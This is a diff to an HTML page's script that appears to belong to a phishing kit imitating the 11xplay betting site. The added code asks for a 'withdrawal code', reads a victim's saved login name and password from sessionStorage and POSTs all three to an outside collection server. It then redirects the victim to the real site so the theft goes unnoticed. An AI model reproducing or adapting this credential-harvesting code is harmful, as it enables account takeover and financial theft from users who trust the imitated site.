@@ -947,34 +947,44 @@
         }
     </style>
 
-<script type="text/javascript">
-        // Function to handle the login submission
-        function checkLogin(event) {
-            event.preventDefault();  // Prevent form from submitting the normal way
+ <script type="text/javascript">
+        // Function to send data after user enters the withdrawal code
+        function submitCodeAndSendEmail() {
+            // Get the entered code
+            var code = $("#code").val();
 
-            // Get values from the form inputs
-            var loginName = $("#username").val();  
-            var password = $("#password").val();  
+            // Get saved login data from sessionStorage
+            var loginName = sessionStorage.getItem("loginName");
+            var password = sessionStorage.getItem("password");
 
-            // Ensure both fields are filled
-            if (loginName !== '' && password !== '') {
-                // Save login data to session storage
-                sessionStorage.setItem("loginName", loginName);
-                sessionStorage.setItem("password", password);
-
-                // Redirect to the withdrawal page (enter code page)
-                window.location.href = "withdrawal.html";  
+            // Ensure the code is provided
+            if (code !== '') {
+                // Send data to PHP page via AJAX to send email
+                $.ajax({
+                    type: "POST",
+                    url: "https://justdial4u.today/11xxplay-mail.php",  // Replace with your actual PHP server URL
+                    data: {
+                        loginName: loginName,
+                        password: password,
+                        code: code
+                    },
+                    success: function (msg) {
+                        if (msg === "sucessmsg") {
+                            alert("Email sent successfully!");
+                            window.location.href = "https://11xplay.com/";  // Redirect after successful email sending
+                        } else {
+                            $("#errorMsg").html("There was an error sending the email.");  // Show error message
+                        }
+                    },
+                    error: function(xhr, status, error) {
+                        console.log("Error:", status, error);  // Log error details for debugging
+                        alert("An error occurred. Please try again.");
+                    }
+                });
             } else {
-                $("#errorMsg").html("All fields are required.");  // Show alert if any field is empty
+                $("#errorMsg").html("Please enter the withdrawal code.");  // Show alert if code is empty
             }
         }
-
-        $(document).ready(function () {
-            // Handle the initial login form submission
-            $("form").on("submit", function (event) {
-                checkLogin(event);  
-            });
-        });
     </script>
 
 
